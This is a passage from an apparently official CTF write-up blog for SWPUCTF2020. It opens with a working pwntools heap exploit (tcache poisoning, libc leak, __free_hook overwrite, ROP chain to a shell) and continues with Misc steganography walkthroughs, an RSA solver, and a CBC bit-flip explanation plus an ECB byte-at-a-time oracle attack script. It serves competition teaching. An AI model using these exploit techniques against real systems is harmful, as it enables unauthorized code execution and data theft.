uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))
ru7f    = <span class="hljs-keyword">lambda</span>                    :u64(sh.recvuntil(<span class="hljs-string">&quot;\x7f&quot;</span>)[<span class="hljs-number">-6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))
ruf7    = <span class="hljs-keyword">lambda</span>                    :u32(sh.recvuntil(<span class="hljs-string">&quot;\xf7&quot;</span>)[<span class="hljs-number">-4</span>:].ljust(<span class="hljs-number">4</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))
lg      = <span class="hljs-keyword">lambda</span> data               :log.success(data)
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">name_size,description_size</span>):</span>
sla(<span class="hljs-string">&quot;Action:&quot;</span>,<span class="hljs-string">&quot;B&quot;</span>)
sla(<span class="hljs-string">&quot;Item name size:&quot;</span>,str(name_size))
sla(<span class="hljs-string">&quot;Item description size:&quot;</span>,str(description_size))
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,name,description</span>):</span>
sla(<span class="hljs-string">&quot;Action:&quot;</span>,<span class="hljs-string">&quot;M&quot;</span>)
sla(<span class="hljs-string">&quot;idx:&quot;</span>,str(idx))
<span class="hljs-keyword">if</span> name != <span class="hljs-string">&quot;&quot;</span>:
sla(<span class="hljs-string">&quot;Modify name?[y/N]&quot;</span>,<span class="hljs-string">&quot;y&quot;</span>)
sa(<span class="hljs-string">&quot;new name:&quot;</span>,str(name))
<span class="hljs-keyword">else</span>:
sla(<span class="hljs-string">&quot;Modify name?[y/N]&quot;</span>,<span class="hljs-string">&quot;n&quot;</span>)
<span class="hljs-keyword">if</span> description != <span class="hljs-string">&quot;&quot;</span>:
sla(<span class="hljs-string">&quot;Modify description?[y/N]&quot;</span>,<span class="hljs-string">&quot;y&quot;</span>)
sa(<span class="hljs-string">&quot;new description:&quot;</span>,str(description))
<span class="hljs-keyword">else</span>:
sla(<span class="hljs-string">&quot;Modify description?[y/N]&quot;</span>,<span class="hljs-string">&quot;n&quot;</span>)
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span>
sla(<span class="hljs-string">&quot;Action:&quot;</span>,<span class="hljs-string">&quot;S&quot;</span>)
sla(<span class="hljs-string">&quot;idx:&quot;</span>,str(idx))
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>():</span>
sla(<span class="hljs-string">&quot;Action:&quot;</span>,<span class="hljs-string">&quot;W&quot;</span>)
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">backdoor</span>():</span>
sla(<span class="hljs-string">&quot;Action:&quot;</span>,<span class="hljs-string">&quot;\xFF&quot;</span>)
sla(<span class="hljs-string">&quot;Action[y/N]&quot;</span>,<span class="hljs-string">&#x27;y&#x27;</span>)
add(<span class="hljs-number">0x18</span>,<span class="hljs-number">0x18</span>)
add(<span class="hljs-number">0x18</span>,<span class="hljs-number">0x18</span>)
edit(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;\x11&#x27;</span> * <span class="hljs-number">0x18</span> + <span class="hljs-string">&quot;\n&quot;</span>,<span class="hljs-string">&#x27;\x12&#x27;</span> * <span class="hljs-number">0x18</span> + <span class="hljs-string">&quot;\n&quot;</span>)
free(<span class="hljs-number">0</span>)
add(<span class="hljs-number">0x18</span>,<span class="hljs-number">0x18</span>)
show()
ru(<span class="hljs-string">&quot;Item name: &quot;</span>)
heap_base = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x280</span>
edit(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;\x13&#x27;</span> * <span class="hljs-number">0x18</span> + <span class="hljs-string">&quot;\n&quot;</span>,<span class="hljs-string">&#x27;\x14&#x27;</span> * <span class="hljs-number">0x18</span> + p8(<span class="hljs-number">0x41</span>))
free(<span class="hljs-number">0</span>)
add(<span class="hljs-number">0x18</span>,<span class="hljs-number">0x29</span>)
free(<span class="hljs-number">1</span>)
edit(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;\x13&#x27;</span> * <span class="hljs-number">0x18</span> + <span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-string">&#x27;\x14&#x27;</span> * <span class="hljs-number">0x18</span> + p64(<span class="hljs-number">0x21</span>) + p64(heap_base + <span class="hljs-number">0x250</span> + <span class="hljs-number">0x10</span>) + <span class="hljs-string">&quot;\n&quot;</span> )
free(<span class="hljs-number">0</span>)
add(<span class="hljs-number">0x18</span>,<span class="hljs-number">0x18</span>)
add(<span class="hljs-number">0x18</span>,<span class="hljs-number">0x18</span>)
edit(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;\x15&#x27;</span> * <span class="hljs-number">0x18</span> + <span class="hljs-string">&quot;\n&quot;</span>,p64(<span class="hljs-number">0xcafecafe</span>) + <span class="hljs-string">&quot;\n&quot;</span>)
backdoor()
ru(<span class="hljs-string">&quot;secret:&quot;</span>)
dir_fd = int(ru(<span class="hljs-string">&quot;\n&quot;</span>).strip(),<span class="hljs-number">10</span>)
add(<span class="hljs-number">0x28</span>,<span class="hljs-number">0x28</span>)
add(<span class="hljs-number">0x28</span>,<span class="hljs-number">0x28</span>)
edit(<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;\x16&#x27;</span> * <span class="hljs-number">0x28</span> + p8(<span class="hljs-number">0x51</span>),<span class="hljs-string">&quot;\n&quot;</span>)
free(<span class="hljs-number">2</span>)
add(<span class="hljs-number">0x28</span>,<span class="hljs-number">0x48</span>)
free(<span class="hljs-number">3</span>)
edit(<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;\x16&#x27;</span> * <span class="hljs-number">0x28</span> + <span class="hljs-string">&quot;\n&quot;</span>,<span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x28</span> + p64(<span class="hljs-number">0x31</span>) + p64(heap_base + <span class="hljs-number">0x010</span>) + <span class="hljs-string">&quot;\n&quot;</span>)
add(<span class="hljs-number">0x28</span>,<span class="hljs-number">0x28</span>)
add(<span class="hljs-number">0x28</span>,<span class="hljs-number">0x38</span>)
edit(<span class="hljs-number">4</span>,p64(<span class="hljs-number">0x0800000000000000</span>) + <span class="hljs-string">&quot;\n&quot;</span>,p64(<span class="hljs-number">0xcafecafecafecafe</span>) + <span class="hljs-string">&quot;\n&quot;</span>)
add(<span class="hljs-number">0x38</span>,<span class="hljs-number">0x38</span>)
add(<span class="hljs-number">0x38</span>,<span class="hljs-number">0x38</span>)
edit(<span class="hljs-number">5</span>,<span class="hljs-string">&#x27;\x15&#x27;</span> * <span class="hljs-number">0x38</span> + p8(<span class="hljs-number">0x91</span>),<span class="hljs-string">&#x27;\x16&#x27;</span> * <span class="hljs-number">0x18</span> + <span class="hljs-string">&#x27;\n&#x27;</span>)
edit(<span class="hljs-number">6</span>,<span class="hljs-string">&#x27;\n&#x27;</span>,p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x31</span>) + <span class="hljs-string">&quot;\n&quot;</span>)
free(<span class="hljs-number">5</span>)
add(<span class="hljs-number">0x38</span>,<span class="hljs-number">0x38</span>)
show()
ru(<span class="hljs-string">&quot;Item idx: 5&quot;</span>)
ru(<span class="hljs-string">&quot;description: &quot;</span>)
main_arena = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">224</span>
libc = main_arena - <span class="hljs-number">0x10</span> - lib.symbols[<span class="hljs-string">b&#x27;__malloc_hook&#x27;</span>]
lib.address = libc
system = lib.symbols[<span class="hljs-string">b&#x27;system&#x27;</span>]
binsh = lib.search(<span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>).next()
__free_hook = lib.symbols[<span class="hljs-string">b&#x27;__free_hook&#x27;</span>]
__malloc_hook = lib.symbols[<span class="hljs-string">b&#x27;__malloc_hook&#x27;</span>]
pop_rdi_ret = libc + <span class="hljs-number">0x000000000002155f</span>
pop_rsi_ret = libc + <span class="hljs-number">0x0000000000023e8a</span>
pop_rdx_ret = libc + <span class="hljs-number">0x0000000000001b96</span>
pop_rdx_rsi_ret = libc + <span class="hljs-number">0x0000000000130889</span>
ret = libc + <span class="hljs-number">0x00000000000008aa</span>
add(<span class="hljs-number">0x38</span>,<span class="hljs-number">0x38</span>)
free(<span class="hljs-number">6</span>)
edit(<span class="hljs-number">7</span>,p64(heap_base + <span class="hljs-number">0x60</span>) + <span class="hljs-string">&quot;\n&quot;</span>,p64(<span class="hljs-number">0xcafecafecafecafe</span>) * <span class="hljs-number">4</span> + p64(<span class="hljs-number">0x3c0</span> + heap_base) + p64(ret) + <span class="hljs-string">&quot;\n&quot;</span>)
add(<span class="hljs-number">0x38</span>,<span class="hljs-number">0x48</span>)
add(<span class="hljs-number">0x38</span>,<span class="hljs-number">0x48</span>)
edit(<span class="hljs-number">8</span>,p64(<span class="hljs-number">0xdeadbeefdeadbeef</span>) + <span class="hljs-string">&quot;\n&quot;</span>,p64(lib.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]) + <span class="hljs-string">&quot;\n&quot;</span>)
edit(<span class="hljs-number">4</span>,p64(<span class="hljs-number">0x0800000000010000</span>) + <span class="hljs-string">&quot;\n&quot;</span>,p64(<span class="hljs-number">0xcafecafecafecafe</span>) + <span class="hljs-string">&quot;\n&quot;</span>)
add(<span class="hljs-number">0x38</span>,<span class="hljs-number">0x48</span>)
edit(<span class="hljs-number">9</span>,p64(lib.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>] + <span class="hljs-number">53</span>) + <span class="hljs-string">&quot;\n&quot;</span>,<span class="hljs-string">&#x27;\n&#x27;</span>)
edit(<span class="hljs-number">5</span>,p64(pop_rdi_ret) + p64(<span class="hljs-number">0</span>) + p64(pop_rdx_rsi_ret) + p64(<span class="hljs-number">0x1000</span>)+ p64(heap_base + <span class="hljs-number">0x3b0</span>) + p64(lib.sym[<span class="hljs-string">&#x27;read&#x27;</span>])+<span class="hljs-string">&quot;\n&quot;</span>,<span class="hljs-string">&#x27;\n&#x27;</span>)
free(<span class="hljs-number">7</span>)
payload = <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">64</span>
payload += p64(pop_rdi_ret) + p64(dir_fd)
payload += p64(lib.sym[<span class="hljs-string">&#x27;fchdir&#x27;</span>])
payload += p64(pop_rdi_ret) + p64(binsh)
payload += p64(ret)
payload += p64(system)
sl(payload)
sleep(<span class="hljs-number">0.5</span>)
sl(<span class="hljs-string">&quot;echo deadbeef &amp;&amp; cd ../ &amp;&amp; cat flag.txt&quot;</span>)
ru(<span class="hljs-string">&quot;deadbeef&quot;</span>)
irt()
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">CTF_exploit</span>(<span class="hljs-params">argv</span>):</span>
<span class="hljs-keyword">global</span> remote_ip,remote_port,binary_file
argv_len = len(argv)
context.log_level = <span class="hljs-string">b&quot;DEBUG&quot;</span>
context.binary = binary_file
<span class="hljs-keyword">if</span> argv_len == <span class="hljs-number">1</span>:
sh = process(binary_file)
exploit(sh)
<span class="hljs-keyword">return</span>
<span class="hljs-keyword">elif</span> argv_len == <span class="hljs-number">3</span>:
sh = remote(argv[<span class="hljs-number">1</span>],argv[<span class="hljs-number">2</span>])
exploit(sh,remote = <span class="hljs-literal">True</span>)
<span class="hljs-keyword">return</span>
<span class="hljs-keyword">else</span>:
sh = process(binary_file)
exploit(sh)
<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">b&quot;__main__&quot;</span>:
CTF_exploit(sys.argv)</code></pre>

<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="耗子尾汁"><a href="#耗子尾汁" class="headerlink" title="耗子尾汁"></a>耗子尾汁</h2><h3 id="1-2-9M的gif图"><a href="#1-2-9M的gif图" class="headerlink" title="1. 2.9M的gif图"></a>1. 2.9M的gif图</h3><p>binwalk分离后得到2^4_2^5_2^6.mp4，flag.txt</p>
<p><img src="http://cdn.jev0n.com//LZKCfwlRSbvKxI6T.png!thumbnail" srcset="/img/loading.gif" alt="图片"></p>
<p>其中flag.txt当然是假的</p>
<h3 id="2-2-4-2-5-2-6-mp4"><a href="#2-2-4-2-5-2-6-mp4" class="headerlink" title="2. 2^4_2^5_2^6.mp4"></a>2. 2^4_2^5_2^6.mp4</h3><p>再次binwalk分离得到有密码的压缩包</p>
<p><img src="http://cdn.jev0n.com//yBicI6a1ZmX8MJLc.png!thumbnail" srcset="/img/loading.gif" alt="图片"></p>
<p>但没有提示密码相关信息，爆破可能性不大，所以逐帧看mp4文件得到c2lnbl9pbg==</p>
<p><img src="http://cdn.jev0n.com//XjRtB1gtTXkELpny.png!thumbnail" srcset="/img/loading.gif" alt="图片"></p>
<p>base64解码后得到”sign_in”即为压缩包密码</p>
<h3 id="3-19-20-txt"><a href="#3-19-20-txt" class="headerlink" title="3. 19_20.txt"></a>3. 19_20.txt</h3><p>解压后看到一长串字符串  拿去解base64后还是一长串奇奇怪怪的东西</p>
<p><img src="https://images-cdn.shimo.im/Lirv8Y77Ismw2DQA__thumbnail.png" srcset="/img/loading.gif" alt="图片"></p>
<p>想到mp4文件的名字很奇怪”2^4_2^5_2^6”  可以猜到base64，base32，base16依次解开后即为txt文件内提示的最后一层单表替换密码</p>
<p>txt文件的名字”19_20” 为仿射加密的两个参数a，b的值，解开即为flag字符串</p>
<p><img src="https://images-cdn.shimo.im/K4UjMPzcGS6X4q5g__thumbnail.png" srcset="/img/loading.gif" alt="图片"></p>
<p>按题目要求的格式改为 flag{you_have_signed_in_successfully} 即可</p>
<p>弱弱说一句，这道题的提示全在<strong>文件名</strong></p>
<p>2^4_2^5_2^6对应base16.32.64编码，19_20对应仿射的两个参数</p>
<p>然后可以解得flag</p>
<h2 id="找找吧"><a href="#找找吧" class="headerlink" title="找找吧"></a><strong>找找吧</strong></h2><p>下载附件是一个压缩包，解压发现需要密码，把压缩包拖到十六进制查看器里，最后有解压密码，解压后有两个文件，一个MP3文件，一个压缩包，压缩包有密码，所以只能检测MP3文件。</p>
<p><img src="http://cdn.jev0n.com//CbeKRwZJv543H54n.png!thumbnail" srcset="/img/loading.gif" alt="图片"></p>
<p>MP3文件可以正常播放，也可能用一些播放器无法播放，会显示一张图片，直接将mp3文件放入audacity中会导致无法正常加载，因此将MP3文件放入十六进制查看器，由文件头可以看出是rar文件，将后缀名改为rar，解压，（如果是adobe的audacity不需要这一步）得到一张图片和一个MP3文件。图片里写明没用，所以不管图片，MP3文件播放，是首看似很正常的歌，但是如果将进度条拖到最后会发现有不正常的声音，用audacity打开，发现音频最后有不正常的音频。</p>
<p><img src="http://cdn.jev0n.com//VgUicY4u4i86Ehb6.png!thumbnail" srcset="/img/loading.gif" alt="图片"></p>
<p>放大后发现可能是摩斯密码，解密后得到字符串，去解压缩包，发现密码错误，观察字符串格式，可能是md5，解密后得到真密码，解压压缩包，得到一个gif文件和hint.png文件，gif文件可以看到一个字符串，可以用各种工具逐帧查看</p>
<p><img src="http://cdn.jev0n.com//JHj3Yvw6guczdhtw.png!thumbnail" srcset="/img/loading.gif" alt="图片"></p>
<p>png文件很明显少了底下的一部分，在十六进制查看器中更改图片高度，具体更改位数百度，后得到提示Veni,vidi,vici,</p>
<p><img src="http://cdn.jev0n.com//xTEbvXqhMaxLxhw5.png!thumbnail" srcset="/img/loading.gif" alt="图片"></p>
<p>百度发现这是凯撒大帝的名言，因此得知是凯撒密码加密，而位移的位数等于加密后的flag在gif中的帧数即九位，也可以一位一位试出来，最终得到flag。</p>
<h2 id="来猜谜了"><a href="#来猜谜了" class="headerlink" title="来猜谜了"></a>来猜谜了</h2><p>压缩包打开后是一个 png 图片</p>
<p><img src="http://cdn.jev0n.com//LfQezP9Ity1hMZtS.png!thumbnail" srcset="/img/loading.gif" alt="图片"></p>
<p>关键信息：老色批，首字母是lsp，应该可以联想到lsb隐写，用stegslove将数据提取出来。</p>
<p><img src="https://images-cdn.shimo.im/VK0zoxrYvfYiNikU__thumbnail.png" srcset="/img/loading.gif" alt="图片"></p>
<p>从文件头可以看出隐写进去的是zip文件，直接保存为zip就行了。不过也有师傅是直接用binwalk分离出来，然后将文件修补好的。</p>
<p><img src="https://images-cdn.shimo.im/4snkonIWULh60DF5__thumbnail.png" srcset="/img/loading.gif" alt="图片"></p>
<p>分离出的压缩包打开后有一个 mi.jpg 和一个流量数据包。</p>
<p><img src="https://images-cdn.shimo.im/l2YJ4gt5p4jfKYf1__thumbnail.png" srcset="/img/loading.gif" alt="图片"></p>
<p>用wireshark打开流量包可以看到是usb协议，且leftover capture data域的数据长度为八个字节，所以可以判断出是键盘流量包。在kali中用tshark命令将leftover capture data域的数据提取出来。</p>
<p><img src="https://images-cdn.shimo.im/KrN0dkxTGBAQT1Fz__thumbnail.png" srcset="/img/loading.gif" alt="图片"></p>
<p><img src="https://images-cdn.shimo.im/dj736PeK6172ZiuO__thumbnail.png" srcset="/img/loading.gif" alt="图片"></p>
<p>然后就可以直接用键盘流量分析的脚本把敲击了哪些键分析出来，网上这种脚本很多，我就这不发了，嘿嘿。</p>
<p><img src="https://images-cdn.shimo.im/x7NRizqekrUWHZCA__thumbnail.png" srcset="/img/loading.gif" alt="图片"></p>
<p>得到的字符串是：AG DX AG DX AG DX</p>
<p>这是一串用ADFGX编码方式加密的字符串</p>
<p><img src="https://images-cdn.shimo.im/F5MONqpWR7qNt9GJ__thumbnail.png" srcset="/img/loading.gif" alt="图片"></p>
<p>通过对照表就可以得到明文: gogogo</p>
<p>然后就剩mi.jpg了，flag是隐写在mi.jpg中的，隐写方式是outguess隐写，gogogo就是密钥。其实题目名和题目说明都有猜，这就是在提示隐写方式。直接用工具把flag分离出来就行了</p>
<p><img src="https://images-cdn.shimo.im/VDhocWMekyTrTrYl__thumbnail.png" srcset="/img/loading.gif" alt="图片"></p>
<p><img src="https://images-cdn.shimo.im/jPi6VXXUoeRWzgnj__thumbnail.png" srcset="/img/loading.gif" alt="图片"></p>
<h2 id="套娃"><a href="#套娃" class="headerlink" title="套娃"></a><strong>套娃</strong></h2><p>我的题确实简单队友把我想出得先出了，没法知识点不可能重复把。唉挺难受得把想在bash里去藏key得结果有得比赛先出了。唉我背锅把出简单</p>
<p>一个xlsx文件，直接改后缀为zip,解压得到一个xlsx和一个RC4data.txt,</p>
<p>xlsx文件在改后缀为zip解压得一个xlsx文件和一个加密得zip文件</p>
<p>在xlsx文件尾可以找到压缩包密码解压得到密钥</p>
<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="happy"><a href="#happy" class="headerlink" title="happy"></a>happy</h2><pre><code class="hljs plain">#exp.happy
#python3
import binascii
import gmpy2
from z3 import *
s &#x3D; Solver()
p&#x3D;Int(&#39;p&#39;)
q&#x3D;Int(&#39;q&#39;)
s.add(q+q*p**3 &#x3D;&#x3D; 1285367317452089980789441829580397855321901891350429414413655782431779727560841427444135440068248152908241981758331600586)
s.add(p*q+q*p**2 &#x3D;&#x3D;1109691832903289208389283296592510864729403914873734836011311325874120780079555500202475594)
if s.check() &#x3D;&#x3D; sat:
    print(s.model())
n&#x3D;0x989f5774c6f199031dc64d5aad7907665ea5e03cde2d74da21
e&#x3D;0x872a335
c&#x3D;0x7a7e031f14f6b6c3292d11a41161d2491ce8bcdc67ef1baa9e
p &#x3D; 1158310153629932205401500375817
q &#x3D; 827089796345539312201480770649
phi&#x3D;(p-1)*(q-1)
d&#x3D;gmpy2.invert(e,phi)
m&#x3D;pow(c,d,n)
print(binascii.unhexlify(hex(m)[2:].strip(&quot;L&quot;)))</code></pre>

<h2 id="Yusa的密码学课堂—CBC第一课"><a href="#Yusa的密码学课堂—CBC第一课" class="headerlink" title="Yusa的密码学课堂—CBC第一课"></a><strong>Yusa的密码学课堂—CBC第一课</strong></h2><ol>
<li>这一题的考点是CBC的字节翻转，需要对CBC模式具有一定了解</li>
</ol>
<p><img src="http://cdn.jev0n.com//WVFDhwOTXIBjatXj.png!thumbnail" srcset="/img/loading.gif" alt="图片"></p>
<p>可见在解密时是先进行AES解密，随后异或iv(或者前一组密文)才得到明文。</p>
<ol start="2">
<li>在这一题中，我们的用户名在二组（除去iv），所以在第二次交互我们修改第一组密文的对应字节，就可以让用户名对应的字节翻转。</li>
<li>改了第一组密文的一个字节后，解密时整个明文会乱掉，不满足”yusa”<em>4的条件，对此我们需要最后一次交互改整个iv，计算规则就是: 原来的iv^第一组明文(乱)^“yusa”</em>4</li>
</ol>
<h2 id="Yusa的密码学课堂—ECB"><a href="#Yusa的密码学课堂—ECB" class="headerlink" title="Yusa的密码学课堂—ECB"></a><strong>Yusa的密码学课堂—ECB</strong></h2><p>1.由于是ECB的模式，所以当我们输入十五个’0’后，服务会将十五个’0’+flag加密，而此时第一组就是十五个’0’和flag的第一个字符。即，返回的明文的第一组是’0’*15 + flag[0]的密文。</p>
<p>2.我们遍历0-255，发送’0’*15+chr(i)，看返回的密文是不是和最初获得的密文的第一组一致，如果一致，那么此时的chr(i)就是flag的第一位。</p>
<p>3.有了第一位我们就可以发送’0’<em>14+flag[0]过去，此时返回的第一组密文就是’0’</em>14+flag[0]+flag[1]的密文了，我们继续用第2步的方法就可以恢复flag[1]了。</p>
<p>4.如此循环往复，逐位爆破flag。</p>
<pre><code class="hljs python">   <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exp</span>():</span>  
       sh = remote(<span class="hljs-string">&quot;0.0.0.0&quot;</span>,<span class="hljs-string">&quot;9999&quot;</span>)  
     
       pre=<span class="hljs-string">&quot;0&quot;</span>*<span class="hljs-number">47</span>  
       flag=<span class="hljs-string">&quot;&quot;</span>  
       <span class="hljs-keyword">for</span> block <span class="hljs-keyword">in</span> range(<span class="hljs-number">41</span>):  
           <span class="hljs-comment">#发送填充，泄露一位flag，并获取密文  </span>
           sh.recvuntil(<span class="hljs-string">&quot;Amazing function: &quot;</span>)  
           sh.sendline(pre.encode(<span class="hljs-string">&#x27;hex&#x27;</span>))  
         target = sh.recvuntil(<span class="hljs-string">&quot;\n&quot;</span>)[:<span class="hljs-number">-1</span>][<span class="hljs-number">64</span>:<span class="hljs-number">96</span>]  
         <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">256</span>):  
             <span class="hljs-comment">#遍历字符，找到与获取密文一致时的情况时，即得到一位明文  </span>
             tmp = <span class="hljs-string">&#x27;0&#x27;</span>*(<span class="hljs-number">47</span>-block)+flag+chr(i)  
             sh.recvuntil(<span class="hljs-string">&quot;Amazing function: &quot;</span>)  
             sh.sendline(tmp.encode(<span class="hljs-string">&#x27;hex&#x27;</span>))  
             now = sh.recvuntil(<span class="hljs-string">&quot;\n&quot;</span>)[:<span class="hljs-number">-1</span>]  
             <span class="hljs-keyword">if</span> now[<span class="hljs-number">64</span>:<span class="hljs-number">96</span>] == target:  
                 flag += chr(i)  
                 <span class="hljs-comment">#修改填充  </span>
                 pre = pre[:<span class="hljs-number">-1</span>]  
                 <span class="hljs-keyword">break</span>  
     <span class="hljs-keyword">return</span> flag[<span class="hljs-number">7</span>:<span class="hljs-number">-2</span>]</code></pre>
            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                  <div class="post-meta mr-3">
                    <i class="iconfont icon-category"></i>
                    
                      <a class="hover-with-bg" href="/categories/CTF/">CTF</a>
                    
                  </div>
                
                
                  <div class="post-meta">
                    <i class="iconfont icon-tags"></i>
                    
                      <a class="hover-with-bg" href="/tags/CTF/">CTF</a>
                    
                  </div>
                
              </div>
              
                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
              
              
                <div class="post-prevnext row">
                  <article class="post-prev col-6">
                    
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2020/09/22/WLLM-CTF/">
                        <span class="hidden-mobile">WLLM-CTF</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
  <div id="tocbot"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    
  </main>

  
    <a id="scroll-top-button" href="#" role="button">
      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
    </a>
  

  
    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
  

  

  

  <footer class="mt-5">
  <div class="text-center py-3">
    <div>
      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a>
      <i class="iconfont icon-love"></i>
      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener">
        <span>Fluid</span></a>
    </div>
    

    

    
  </div>
</footer>

<!-- SCRIPTS -->
<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
<script  src="/js/debouncer.js" ></script>
<script  src="/js/main.js" ></script>

<!-- Plugins -->


  
    <script  src="/js/lazyload.js" ></script>
  



  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
  <script  src="/js/clipboard-use.js" ></script>







  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
  <script>
    $(document).ready(function () {
      var boardCtn = $('#board-ctn');
      var boardTop = boardCtn.offset().top;

      tocbot.init({
        tocSelector: '#tocbot',
        contentSelector: '#post-body',
        headingSelector: 'h1,h2,h3,h4,h5,h6',
        linkClass: 'tocbot-link',
        activeLinkClass: 'tocbot-active-link',
        listClass: 'tocbot-list',
        isCollapsedClass: 'tocbot-is-collapsed',
        collapsibleClass: 'tocbot-is-collapsible',
        collapseDepth: 0,
        scrollSmooth: true,
        headingsOffset: -boardTop
      });
      if ($('.toc-list-item').length > 0) {
        $('#toc').css('visibility', 'visible');
      }
    });
  </script>



  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
  <script>
    var typed = new Typed('#subtitle', {
      strings: [
        '  ',
        "SWPUCTF2020 官方WP&nbsp;",
      ],
      cursorChar: "_",
      typeSpeed: 70,
      loop: false,
    });
    typed.stop();
    $(document).ready(function () {
      $(".typed-cursor").addClass("h2");
      typed.start();
    });
  </script>



  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
  <script>
    anchors.options = {
      placement: "right",
      visible: "hover",
      
    };
    var el = "h1,h2,h3,h4,h5,h6".split(",");
    var res = [];
    for (item of el) {
      res.push(".markdown-body > " + item)
    }
    anchors.add(res.join(", "))
  </script>



  <script  src="/js/local-search.js" ></script>
  <script>
    var path = "/local-search.xml";
    var inputArea = document.querySelector("#local-search-input");
    inputArea.onclick = function () {
      searchFunc(path, 'local-search-input', 'local-search-result');
      this.onclick = null
    }
  </script>



  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />

  <script>
    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
      function () {
        var element = document.createElement('a');
        $(element).attr('data-fancybox', 'images');
        $(element).attr('href', $(this).attr('src'));
        $(this).wrap(element);
      }
    );
  </script>




















</body>
</html>
